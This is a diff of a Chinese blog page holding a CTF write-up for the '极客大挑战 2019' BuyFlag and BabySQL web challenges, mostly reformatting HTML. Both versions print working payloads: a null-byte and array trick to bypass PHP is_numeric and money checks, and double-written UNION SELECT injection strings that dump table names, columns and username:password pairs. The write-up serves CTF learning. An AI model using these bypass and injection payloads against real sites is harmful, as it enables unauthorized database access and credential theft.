@@ -83,12 +83,12 @@
 
 
 
-<meta name="description" content="BuyFlag查看网页源代码找到一处php代码：抓包查看：将user&#x3D;1然后绕过is_numeric函数，通过%00截断绕过。然后需要money字段，用到数组绕过。payload：1password&#x3D;404%00&amp;money[]&#x3D;100000000  BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普">
+<meta name="description" content="BuyFlag查看网页源代码找到一处php代码：  抓包查看：将user&#x3D;1  然后绕过is_numeric函数，通过%00截断绕过。  然后需要money字段，用到数组绕过。  payload： 1password&#x3D;404%00&amp;money[]&#x3D;100000000   BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2.8 [极客大挑战 2019]BuyFlag&amp;BabySQL">
 <meta property="og:url" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="BuyFlag查看网页源代码找到一处php代码：抓包查看：将user&#x3D;1然后绕过is_numeric函数，通过%00截断绕过。然后需要money字段，用到数组绕过。payload：1password&#x3D;404%00&amp;money[]&#x3D;100000000  BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普">
+<meta property="og:description" content="BuyFlag查看网页源代码找到一处php代码：  抓包查看：将user&#x3D;1  然后绕过is_numeric函数，通过%00截断绕过。  然后需要money字段，用到数组绕过。  payload： 1password&#x3D;404%00&amp;money[]&#x3D;100000000   BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过">
 <meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png">
 <meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png">
 <meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png">
@@ -358,7 +358,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  188
+                  189
                 </span>
               
 
@@ -395,10 +395,25 @@
       
 
       
-        <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er"><br><strong>抓包查看：将user=1</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er"><br><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er"><br><strong>然后需要money字段，用到数组绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure></p>
+        <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er">
+<p><strong>抓包查看：将user=1</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er">
+<p><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er">
+<p><strong>然后需要money字段，用到数组绕过。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er">
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure>
+
 <hr>
-<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er"><br>使用的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure></p>
+<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er">
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er">
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er">
+<p>使用的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -527,7 +542,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
